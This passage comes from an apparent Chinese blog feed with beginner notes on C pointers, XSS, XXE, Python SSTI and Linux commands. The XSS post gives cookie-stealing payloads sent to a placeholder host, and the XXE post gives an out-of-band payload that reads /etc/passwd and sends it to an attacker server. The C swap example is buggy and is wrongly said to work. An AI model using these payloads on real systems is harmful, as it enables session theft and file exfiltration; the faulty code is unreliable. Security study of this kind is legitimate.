<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Swap</span><span class="params">(<span class="keyword">int</span> *x,<span class="keyword">int</span> *y)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> temp=x;</span><br><span class="line">    x=y;</span><br><span class="line">    y=temp;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">int</span> *a,*b;</span><br><span class="line"><span class="keyword">int</span> c=<span class="number">1</span>,d=<span class="number">2</span>;</span><br><span class="line">a=&amp;c;</span><br><span class="line">b=&amp;d;</span><br><span class="line">Swap(a,b);</span><br><span class="line">Swap(&amp;c,&amp;d);</span><br></pre></td></tr></table></figure>
<p>上面代码里面，两次交换都真正交换了a和b的值，只不过是两种不同的方法。函数的形参声明只能声明为指针类型，这样才能接受实参传过来的地址。</p>
<h2 id="一维数组和指针"><a href="#一维数组和指针" class="headerlink" title="一维数组和指针"></a>一维数组和指针</h2><p>数组名是一个常量指针（无法被修改的指针），里面保存的值是这个数组第一个元素的地址，可以通过地址的计算来访问数组中的其他元素。</p>
<p>下面用代码展示，数组本质上是通过指针实现的。对于指针进行的加减运算，是对内存地址每次一个指针空间大小的加减，比如下面的 p+2 实际上地址是加了两个 int 的大小，也就是 8 位。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> a[<span class="number">10</span>]=&#123;<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> *p=a;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%x %x\n&quot;</span>,a,p);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d %d\n&quot;</span>,a[<span class="number">2</span>],*(a+<span class="number">2</span>));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d %d\n&quot;</span>,p[<span class="number">2</span>],*(p+<span class="number">2</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">/*输出结果</span></span><br><span class="line"><span class="comment">60fe74 60fe74</span></span><br><span class="line"><span class="comment">2 2</span></span><br><span class="line"><span class="comment">2 2</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>
<h2 id="二维数组和指针"><a href="#二维数组和指针" class="headerlink" title="二维数组和指针"></a>二维数组和指针</h2><p>对于二维数组，同样也是指针，不过不同的是二维数组是由一个指针数组实现的。像 <code>a[10][10]</code> 这样的二维数组，<code>a[i]</code> 就是一个指针，保存着第 i 行数组的第一个元素的内存地址。我们可以通过下面这样来使用指针来访问数组元素:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> a[<span class="number">2</span>][<span class="number">5</span>]=&#123;<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>&#125;;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%x %x %d %d&quot;</span>,*(a+<span class="number">0</span>),*(a+<span class="number">1</span>),*(*(a+<span class="number">0</span>)+<span class="number">0</span>),*((a+<span class="number">1</span>)+<span class="number">0</span>));</span><br><span class="line"># 结果： <span class="number">60f</span>e78 <span class="number">60f</span>e8c <span class="number">0</span> <span class="number">5</span></span><br></pre></td></tr></table></figure>
<p>说明了和一维数组不同的是，二维数组的数组名，是一个二重指针。</p>
<p>那么如何<strong>声明一个指向二维数组的指针</strong>呢，方法就是：<code>int (*P)[5]</code> ，这样这个 p 指针就可以指向二维数组 <code>a[2][5]</code> 了。</p>
<p>在进行指针运算的时候会涉及到行运算，也就是一次性运算跳跃 <code>j*sizeof(int)</code> 位的地址。所以在声明指针的时候，必须告诉编译器这个二维数组的列数，不然无法计算对应的内存地址。</p>
<p>要注意的是声明的时候不要写成 <code>int *p[5]</code> ，因为数组下表运算符 <code>[]</code> 的优先级高于指针运算符 <code>*</code>，所以这个会被定义为一个指针数组，里面可以装 5 个内存地址数据。</p>
<h2 id="字符串与指针"><a href="#字符串与指针" class="headerlink" title="字符串与指针"></a>字符串与指针</h2><p>C语言中有两种方式来保存字符串，一种方式是通过字符数组，另外一个是通过字符指针。</p>
<p>字符指针可以直接接受一个字符串常量或者接受一个字符数组首地址来赋值。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">char</span> <span class="built_in">string</span>[<span class="number">20</span>]=<span class="string">&quot;Xorex&quot;</span>;</span><br><span class="line"><span class="keyword">char</span> *P=<span class="built_in">string</span>;</span><br><span class="line"><span class="comment">//或者这样：</span></span><br><span class="line"><span class="keyword">char</span> *P=<span class="string">&quot;Xorex&quot;</span>;</span><br></pre></td></tr></table></figure>
<p>字符串输出的时候，<code>printf</code> 函数自带了特殊的参数 <code>%s</code> ，这个参数接受的实参是一个内存地址，然后它会将这个内存地址里面以及其后面的所有字符都输出出来，直到遇到字符串的结尾：<code>\0</code> 结束输出。</p>
<h2 id="结构体与指针"><a href="#结构体与指针" class="headerlink" title="结构体与指针"></a>结构体与指针</h2><p>可以声明一个结构体指针，来指向一个结构体。定义方法和其他类型一样，前面加上一个星号就可以了。</p>
<p>结构体指针调用结构体里面的元素也很方便，有两个种方法，一种是 <code>(*p).point</code> 一种是 <code>p-&gt;point</code> ，区别就是否使用指针运算，如果使用就是和普通的结构体调用一样了。</p>
<p>当然，像是套娃，什么的也是可以做到的：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Edge</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">int</span> <span class="keyword">this</span>;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Edge</span> *<span class="title">Next</span>;</span></span><br><span class="line">&#125;a,c,*b;</span><br><span class="line"></span><br><span class="line">b=&amp;a;</span><br><span class="line">(*b).Next=&amp;c;</span><br><span class="line">(*((*b).Next)).<span class="keyword">this</span>=<span class="number">1</span>;</span><br></pre></td></tr></table></figure>
<p>用指针对结构体数组的操作和对普通的数组操作是相同的，直接对内存地址进行运算就可以了</p>
<h2 id="指针数组和指向指针的指针"><a href="#指针数组和指向指针的指针" class="headerlink" title="指针数组和指向指针的指针"></a>指针数组和指向指针的指针</h2><p>指针数组前面已经提过了，和普通数组唯一不同的就是这个数组每个元素保存的都是内存地址，声明方法是 <code>*p[n]</code> 因为 <code>[]</code> 优先级高于 <code>*</code> 所以会先声明一个数组，然后声明这个数组是指针类型的。</p>
<p>然后就是指向指针的指针了，这个东西就是个套娃，声明的时候想要套几层娃就加上几个星号，然后套娃的时候只能套星数小一级的。</p>
<p>可以利用指针套娃来制造多维数组使用。</p>
<h2 id="指向函数的指针"><a href="#指向函数的指针" class="headerlink" title="指向函数的指针"></a>指向函数的指针</h2><p>程序在运行的时候，函数也是放在内存里面的，每个函数都有一个入口地址，即函数的首地址。而函数名就像是数组名一样，保存着这个地址。</p>
<p>那么既然是保存的是内存地址，那么就轮到最擅长处理地址的指针上场了。像其他指针的一样，指向的内存地址类型需要和指针的类型照应，<code>char</code> 类型变量只能由 <code>char *</code> 类型指针指着。那么怎么声明能指向函数的指针呢？</p>
<p>举个例子:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">max</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y)</span></span></span><br><span class="line"><span class="function"></span>&#123;<span class="keyword">return</span> x&gt;y?x:y;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> (*P)(<span class="keyword">int</span> x,<span class="keyword">int</span> y)=max;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d %d&quot;</span>,P(<span class="number">1</span>,<span class="number">2</span>),(*P)(<span class="number">1</span>,<span class="number">2</span>));</span><br><span class="line"><span class="comment">// 输出 2 2</span></span><br></pre></td></tr></table></figure>
<p>下面的就是声明了一个函数指针，因为指针和函数拥有相同的返回值，有用相同的形参，所以这个声明的指针就可以指向上面的 max 函数。</p>
<p>有意思的地方是，<code>printf</code> 两次输出的时候，调用的方法不一样，一次使用的指针运算符，一次没有，但是两者执行效果是一模一样的。这是因为函数名称本质上就是一个指针，它所指向的内存地址就是变量的内存地址，所以调用函数只需要给一个正确的地址就可以了，下面的输出可以表明函数名称本质上就是指向自己内存地址的指针。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%x %x %x&quot;</span>,max,&amp;max,*max);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d %d %d\n&quot;</span>,max(<span class="number">1</span>,<span class="number">2</span>),(&amp;max)(<span class="number">1</span>,<span class="number">2</span>),(*max)(<span class="number">1</span>,<span class="number">2</span>));</span><br><span class="line"><span class="comment">/* 输出：</span></span><br><span class="line"><span class="comment">401560 401560 401560</span></span><br><span class="line"><span class="comment">2 2 2</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>
<p>表明只需要函数所在内存地址加参数就可以调用函数了。而且函数名就是一个指向自己内存地址的指针。</p>
<h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><p>指针是非常强大的一种工具，这篇文章也不过是站在一个初学者角度上的基础用法总结。作为C语言最强大的利器，以后还会再彻彻底底的分析它。</p>
]]></content>
      <categories>
        <category>计算机体系</category>
      </categories>
      <tags>
        <tag>C语言</tag>
        <tag>指针</tag>
      </tags>
  </entry>
  <entry>
    <title>XSS的一些用法</title>
    <url>/2020/11/17/9e579c5f2933/</url>
    <content><![CDATA[<p>XSS漏洞是往网页里面注入JS代码，然后让浏览器执行</p>
<h2 id="偷Cookie"><a href="#偷Cookie" class="headerlink" title="偷Cookie"></a>偷Cookie</h2><ol>
<li><code>&lt;img&gt;</code> 标签</li>
</ol>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span> = <span class="string">document.body.appendChild(document.createElement(</span>&#x27;<span class="attr">img</span>&#x27;))<span class="attr">.setAttribute</span>(&#x27;<span class="attr">src</span>&#x27;,&#x27;<span class="attr">location</span>/?=<span class="string">&#x27;+document.cookie); &gt;</span></span></span><br></pre></td></tr></table></figure>
<ol start="2">
<li><code>&lt;script&gt;</code> 标签</li>
</ol>
<p>重定向链接到 herf：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">windows.location.herf=<span class="string">&#x27;location/?cookie=&#x27;</span>+<span class="built_in">document</span>.cookie</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>新窗口打开链接：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="built_in">window</span>.open(<span class="string">&#x27;location/?cookie=&#x27;</span>+<span class="built_in">document</span>.cookie)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ol start="3">
<li><code>&lt;body&gt;</code> 标签</li>
</ol>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">onload</span>=<span class="string">eval(“document.body.appendChild(document.createElement(</span>&#x27;<span class="attr">img</span>&#x27;))<span class="attr">.setAttribute</span>(&#x27;<span class="attr">src</span>&#x27;,&#x27;<span class="attr">location</span>?=<span class="string">&#x27;+document.cookie);”)&gt;&lt;/body&gt;</span></span></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>信息安全</category>
      </categories>
      <tags>
        <tag>总结</tag>
        <tag>XSS</tag>
      </tags>
  </entry>
  <entry>
    <title>XXE入门</title>
    <url>/2020/11/17/07a4e06f68a0/</url>
    <content><![CDATA[<h1 id="XML"><a href="#XML" class="headerlink" title="XML"></a>XML</h1><h2 id="实体"><a href="#实体" class="headerlink" title="实体"></a>实体</h2><p>在XML中，实体相当于宏或者变量，可以自定义。ENTITY(独立存在物，实体)</p>
<p><img src="C:\Users\Xorex\AppData\Roaming\Typora\typora-user-images\image-20201028142601038.png" alt="image-20201028142601038"></p>
<p>所有实体（除参数实体外）都以一个与字符（&amp;）开始，以一个分号（;）结束。</p>
<p>命名实体（在 XML 规范中也称为内部实体）就是我们在谈论 “实体” 时所指的实体。命名实体在 DTD（Document Type Definition 文档类型定义） 或内部子集（即文档中 &lt;!DOCTYPE&gt; 语句的一部分）中声明，在文档中用作引用。在 XML 文档解析过程中，实体引用将由它的表示替代。</p>
<p>比如在我们使用键盘进行书写 XML 的时候，如果要输入键盘里面没有的希腊字母等文本，可以引用内部已经定义好的实体（宏定义）比如 alpha，然后将我们写下的引用替代为无法输入 α 的UTF-8编码。</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">Greek_Alphabet</span>[</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">alpha</span> <span class="meta-string">&quot;&amp;#x03B1;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure>
<p>这里我们就可以里利用外部能够注入 XML 文件，执行一些恶意的代码。</p>
<p>XML还支持外部实体引用:</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">BOOK</span>[</span></span><br><span class="line"><span class="meta">&lt;!-- Reference the outer XML document: --&gt;</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">chap1</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;chapter-1.xml&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">chap2</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;chapter-2.xml&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">chap3</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;chapter-3.xml&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- Pull in the chapter content: --&gt;</span></span><br><span class="line">&amp;chap1;</span><br><span class="line">&amp;chap2;</span><br><span class="line">&amp;chap3;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>如果没有XML的回显的话，我们就可以轻易的利用XML支持外部实体的特点，进行远程回显，使用send将文件远程发送到我们自己服务器的监听端口。</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">any</span>[</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">file</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file://etc/passwd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">remote</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://yourip/eval.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">%remote;</span></span><br><span class="line"><span class="meta">%send;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">foo</span>&gt;</span><span class="tag">&lt;/<span class="name">foo</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>信息安全</category>
      </categories>
      <tags>
        <tag>总结</tag>
        <tag>XXE</tag>
      </tags>
  </entry>
  <entry>
    <title>Python和SSTI</title>
    <url>/2020/11/17/6ab47eb2796d/</url>
    <content><![CDATA[<p>Python 和 PHP 一样，也有很多系统定义属性和方法，这些属性和方法是不需要自己定义的，在Python里面系统自动拥有的属性和方法。</p>
<p>这些方法和属性的访问方式是 <code>___XXX___</code> 。全部是基于类的调用。</p>
<h2 id="类的保留属性"><a href="#类的保留属性" class="headerlink" title="类的保留属性"></a>类的保留属性</h2><p>类的保留属性，也就是当我们声明一个类的时候，这个类会自动生成下面的属性，里面记录着这个类的各种信息。</p>
<ol>
<li><code>__doc__</code>  此属性记录这类的描述信息（描述信息往往是声明类的时候写的：）类和实例都有效</li>
</ol>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Xorex</span>():</span></span><br><span class="line">    <span class="string">&#x27;This is a class discribing about Xorex!&#x27;</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">print(Xorex.__doc__)</span><br></pre></td></tr></table></figure>
<p>上面就会输出语句：<code>This is a class discribing about Xorex!</code></p>
<ol start="2">
<li><code>__name__</code> 此属性记录着类的名称，仅仅类有效</li>
</ol>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Xorex</span>():</span></span><br><span class="line">    <span class="string">&#x27;This is a class discribe about Xorex!&#x27;</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">Person=Xorex()</span><br><span class="line"></span><br><span class="line">print(Person.__class__.__name__)</span><br><span class="line">print(Xorex.__name__)</span><br></pre></td></tr></table></figure>
<ol start="3">
<li><p><code>__module__</code> 此属性记录着类所在的模块（如果类在主程序定义，返回 <code>__main__</code>，否则返回类定义所在的模块/文件名），类和实例都有效。</p>
</li>
<li><p><code>__dict__</code> 记录着这个类的所有成员信息（包括系统定义的以及自己声明的类的属性和方法）。只对类和实例还有模块有效，以下是对一个空类 Tempest() 的<code>__dict__</code> 属性保存的信息。</p>
</li>
</ol>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">&#x27;__module__&#x27;</span>: <span class="string">&#x27;__main__&#x27;</span>, <span class="string">&#x27;__dict__&#x27;</span>: &lt;attribute <span class="string">&#x27;__dict__&#x27;</span> of <span class="string">&#x27;Tempest&#x27;</span> objects&gt;, <span class="string">&#x27;__weakref__&#x27;</span>: &lt;attribute <span class="string">&#x27;__weakref__&#x27;</span> of <span class="string">&#x27;Tempest&#x27;</span> objects&gt;, <span class="string">&#x27;__doc__&#x27;</span>: <span class="literal">None</span>&#125;</span><br></pre></td></tr></table></figure>
<ol start="5">
<li><code>__class__</code> 此属性记录着实例的类的信息，可以用这个把属性来当作实例来使用。</li>
</ol>
<h2 id="类的基础方法"><a href="#类的基础方法" class="headerlink" title="类的基础方法"></a>类的基础方法</h2><blockquote>
<p>这个东西和 php 的魔术方法非常像，这些方法在不同情况下会被自动执行</p>
</blockquote>
<ol>
<li><code>__init__()</code> 在初始化实例的时候自动执行。</li>
<li><code>__repr__()</code> 是 表象 representation 的缩写，当使用 repr() 来展示一个类的信息的时候，会自动执行。</li>
<li><code>__str__()</code> 当类的实例被当作字符串处理的时候，会自动执行这个方法，这个方法必须返回字符串。</li>
<li><code>__bytes__()</code> 当被当作自己处理的时候，自动执行的方法。</li>
</ol>
<h2 id="SSTI"><a href="#SSTI" class="headerlink" title="SSTI"></a>SSTI</h2><p>先知上面有大佬说 SSTI 更适合被称呼为 Python继承链，我也觉得这种说法非常正确。（啊，好像是三叶草的师傅）</p>
<p>SSTI的思路就是在执行 Python 的代码注入的时候，因为没有继承的类都会包括基类。而基类中有很多子类，子类中有各种各样的属性和方法，我们可以利用构造继承链来调用各种各样的函数，从而实现我们的目的。</p>
<p>（基类：包含所有实体共性的 class 类）</p>
<p>首先需要各种前置知识：</p>
<h3 id="1-class"><a href="#1-class" class="headerlink" title="1. __class__"></a>1. <code>__class__</code></h3><p>返回一个实例所属与的类。</p>
<h3 id="2-bases"><a href="#2-bases" class="headerlink" title="2. __bases__"></a>2. <code>__bases__</code></h3><p>返回这个类的父类（如果没有继承其他类的话，会自动继承基类 object，我们就需要利用这个基类 object）。所以我们可以根据返回的父类，来调用基类 object</p>
<p>我们可以用 <code>&#39;&#39;.__class__.__bases__[1]</code> 来得到基类</p>
<h3 id="3-mro"><a href="#3-mro" class="headerlink" title="3. __mro__"></a>3. <code>__mro__</code></h3><p>这个东西的用法是和 <code>__bases__</code> 是相同的，不同的是，<code>__mro__</code> 是返回这个类的父类的调用顺序（类似于检索方法和属性的顺序），这样也同样达到了列出父类的获取 object 的目的。</p>
<h3 id="4-globals"><a href="#4-globals" class="headerlink" title="4. __globals__"></a>4. <code>__globals__</code></h3><p>这是一个全局属性，用来返回当前函数的空间下能使用的模块，方法，变量。需要在前面配合着函数使用。</p>
<h3 id="5-subclasses"><a href="#5-subclasses" class="headerlink" title="5. __subclasses__()"></a>5. <code>__subclasses__()</code></h3><p>全局方法，获取一个类的子类并且返回，主要是针对 object 基类使用，用来查看基类的各种各样的子类，来找到合适的使用。</p>
<h3 id="6-builtins"><a href="#6-builtins" class="headerlink" title="6. __builtins__"></a>6. <code>__builtins__</code></h3><p>返回内建函数的列表。</p>
<p>内建函数，python已经有的函数，可以直接调用，比如 abs()，max() 等等，这些都是内建函数，都可以通过 <code>__builtins__</code> 进行查看。</p>
<h3 id="7-dir"><a href="#7-dir" class="headerlink" title="7. dir()"></a>7. <code>dir()</code></h3><p>返回参数的属性，方法列表。一般是用来查看基类 object 的子类中有没有什么可以利用的方法，使用 dir() 列出来查看。</p>
]]></content>
      <categories>
        <category>信息安全</category>
      </categories>
      <tags>
        <tag>笔记</tag>
        <tag>Python</tag>
        <tag>SSTI</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux学习笔记</title>
    <url>/2020/11/16/535e743e22ee/</url>
    <content><![CDATA[<h2 id="Linux-简介"><a href="#Linux-简介" class="headerlink" title="Linux 简介"></a>Linux 简介</h2><ul>
<li><p>最早的操作系统相关是Unix操作系统，诞生与1970年，是一个比较完善的分时操作系统。（分时操作系统是使一台计算机采用时间片轮转的方式同时为几个、几十个甚至几百个用户服务的一种操作系统，用来降低使用计算机的成本）</p>
</li>
<li><p>之后C语言诞生了，程序员们用这种高效的，可以移植性强的语言代替汇编语言重写了Unix系统，美国官方将Unix，C语言，ICP/IP协议，当作标准开始推广。成功对后来的计算机发展产生了深远的影响。</p>
</li>
<li><p>有些程序员将Unix系统进行改编，于是就有了各种Unix的衍生版本，如：Sun Solaris、FreeBSD、IBM AIX、HP-UX 等等。</p>
</li>
<li><p>Linus Torvalds 同学在上学时，觉得学校给用的Unix衍生操作系统Minix 太难用了，于是就模仿Unix写了自己的操作系统Linux，并且公开了Linux的源代码，允许所有程序员对Linux进行修改和完善，成功大火。</p>
</li>
<li><p>根据国际公约，南极洲属于全人类的资产，任何国家都不能宣誓主权，于是Linus使用南极的特产——小企鹅，作为了Linux的Logo，象征着Linux的开源精神。</p>
</li>
</ul>
<h2 id="Linux的组成"><a href="#Linux的组成" class="headerlink" title="Linux的组成"></a>Linux的组成</h2><ul>
<li><strong>内核层</strong> ：内核层是操作系统的核心，是直接依附在计算机的硬件系统上面，负责对计算机硬件资源和软件资源的调用。通过高效有序的控制，来最大化的发挥出来硬件的能力，为用户提供一个安全，可靠，高效的应用环境。</li>
<li><strong>Shell(壳)层</strong> ： 壳是用来区别核的，而着个shell的目的就是链接用户和Core核，因此这个shell也叫 命令解释器，用来接受用户的命令，然后解释给计算机执行，shell分为图形界面和命令行界面。</li>
<li><strong>应用层</strong> ：应用层用来提供一个图形环境，用来支持操作系统中的各种应用，但是Linux不需要安装GUI就可以提供完整的功能。</li>
</ul>
<h2 id="常用系统工作命令"><a href="#常用系统工作命令" class="headerlink" title="常用系统工作命令"></a>常用系统工作命令</h2><ol>
<li><code>date</code> 显示当前的时间。</li>
<li><code>reboot</code> 重启计算机。</li>
<li><code>poweroff</code> 关闭当前计算机。</li>
<li><code>ps</code> 用来查看系统中的进程状态。</li>
<li><code>top</code> 强化版本的任务管理器。</li>
<li><code>pidof</code> 后面加某一进程的名称，然后返回这一进程的PID值。</li>
<li><code>kill</code> 后面加后一进程的PID值，用来杀掉该进程。<ul>
<li><code>killall</code> 后面加某一应用的名称，会杀掉所有该应用的进程。</li>
</ul>
</li>
<li><code>echo</code> 后面加想要输出的内容，可以是变量，可以是字符串。</li>
</ol>
<h2 id="系统状态检测命令"><a href="#系统状态检测命令" class="headerlink" title="系统状态检测命令"></a>系统状态检测命令</h2><ol>
<li><code>ifconfig</code> 可以获取网卡配置和网络状态信息，inet 后面是IP地址，ether后面是MAC地址。</li>
<li><code>uname -a</code> 可以查看当前系统的系统内核和版本什么的信息。</li>
<li><code>free -h</code> 用来显示当前主机的内存使用的相关信息。</li>
<li><code>who</code> 用来查看当前使用这台计算机的用户信息。</li>
<li><code>last</code> 用来查看最近的所用用户登录记录（这是个可修改的文档）</li>
<li><code>history</code> 可以展示你最近执行的进1000条命令。<ul>
<li><code>history -c</code> 删除最近执行的命令记录。</li>
</ul>
</li>
</ol>
<h2 id="工作目录切换命令"><a href="#工作目录切换命令" class="headerlink" title="工作目录切换命令"></a>工作目录切换命令</h2><ol>
<li><p><code>pwd</code> 返回现在所处位置（Print Working Director）</p>
</li>
<li><p><code>cd</code> 切换工作目录 （change director）</p>
<ul>
<li><code>cd location</code> 打开对应的目录（文件夹）</li>
<li><code>cd ..</code> 返回上一级目录</li>
<li><code>cd ~</code> 可以快速返回当前用户的家目录里面。</li>
<li>如果路径里面包含有空格/问号/星号/货币符/逻辑符/括号，可以使用 <code>\</code> 来进行转义，让它变成路径名称而不是特殊字符。或者直接用双引号把路径名称名称括起来，<code>cd &quot;特殊字符的路径&quot;</code> 。</li>
</ul>
</li>
<li><p><code>ls</code> 显示当前工作目录下的内容（list files）</p>
<ul>
<li><code>ls -a</code> 可以显示出来所有的文件，包括隐藏的文件。</li>
<li><code>ls -l</code> 查看文件属性，大小等详细信息。</li>
<li><code>ls ./*</code> 这个符号 <code>*</code> 表示的是正则匹配，<code>file*</code> 就是匹配所有以<code>file</code> 开头的文件或者目录，如果只有 <code>*</code> 那就是匹配所有名称的文件或者目录。</li>
</ul>
</li>
</ol>
<h2 id="文本文件编辑命令"><a href="#文本文件编辑命令" class="headerlink" title="文本文件编辑命令"></a>文本文件编辑命令</h2><ol>
<li><code>cat</code> 查看少量内容的文本文件。</li>
</ol>
<ul>
<li><code>cat -n &lt;file&gt;</code>在查看文本文件的同时标注行号。<ul>
<li>如果文件名用 <code>-</code> 开头，使用 <code>./-</code> 来打开</li>
<li>如果文件里面包含有空格/问号/星号/货币符/逻辑符/括号，可以使用 <code>\</code> 来进行转义（注意这里 <code>-</code> 是不可以使用<code>/</code> 来进行转义的，必须使用 <code>./-</code>  ），让它变成文件名而不是特殊字符。或者直接用双引号把文件名称括起来，<code>cat &quot;特殊的文件名称&quot;</code> 。</li>
</ul>
</li>
</ul>
<ol start="2">
<li><p><code>more</code> 查看大量内容的文本文件。</p>
<ul>
<li><code>more -n &lt;file&gt;</code> 再查看大量文本的同时标注行号。</li>
</ul>
</li>
<li><p><code>head -n k &lt;file&gt;</code> 查看file文件前k行的内容。</p>
</li>
<li><p><code>tail -n k &lt;file&gt;</code> 查看file文件后k行的内容。</p>
</li>
<li><p><code>wc</code> 用来显示文本的一些信息。</p>
<ul>
<li><code>wc -l &lt;file&gt;</code> 返回文本的行数。</li>
<li><code>wc -w &lt;file&gt;</code> 返回文本的词数。</li>
<li><code>wc -c &lt;file&gt;</code> 返回文本的字节数。</li>
</ul>
</li>
<li><p><code>stat &lt;file&gt;</code> 用来查看文件的具体存储信息和时间信息，会有三个参数，<strong>Access</strong>访问时间，<strong>Modify</strong>修改时间，<strong>Change</strong>修改时间。</p>
</li>
</ol>
<h2 id="文件目录管理命令"><a href="#文件目录管理命令" class="headerlink" title="文件目录管理命令"></a>文件目录管理命令</h2><ol>
<li><p><code>touch &lt;file&gt;</code> 可以创建一个新的空白文档。</p>
</li>
<li><p><code>mkdir &lt;director&gt;</code> 可以创建一个新的文件夹。</p>
<ul>
<li><code>mkdir -p &lt;director1/director2/directro3&gt;</code>可以创造嵌套的文件夹。</li>
</ul>
</li>
<li><p><code>cp &lt;file1/dire1&gt; &lt;file2/dire2&gt;</code> 复制file1或dire1到dire2目录或者到本地但是重命名为file2。</p>
</li>
<li><p><code>mv &lt;file1/dire1&gt; &lt;file2/dire2&gt;</code> 移动file1或dire1到dire2目录或者到本地但是重命名为file2。</p>
</li>
<li><p><code>rm &lt;file/dire&gt;</code> 命令用于删除文件或者目录。</p>
<ul>
<li><code>rm -f &lt;file/dire&gt;</code> 可以不询问是否删除，并执行删除过程。</li>
<li><code>rm -r &lt;fire/dire&gt;</code> 用来删除目录，不适用 <code>-r</code> 没有办法删除。</li>
</ul>
</li>
<li><p><code>file &lt;filename&gt;</code> 命令用来查看文件的类型。</p>
<ul>
<li><code>&lt;filename&gt;</code> 可以使用 <code>*</code> 来进行正则匹配。</li>
</ul>
</li>
</ol>
<h2 id="打包压缩与搜索命令"><a href="#打包压缩与搜索命令" class="headerlink" title="打包压缩与搜索命令"></a>打包压缩与搜索命令</h2><ol>
<li><p><code>tar</code> 命令用来对文件进行打包，压缩或者解压操作。需要配合各种命令进行操作。</p>
<ul>
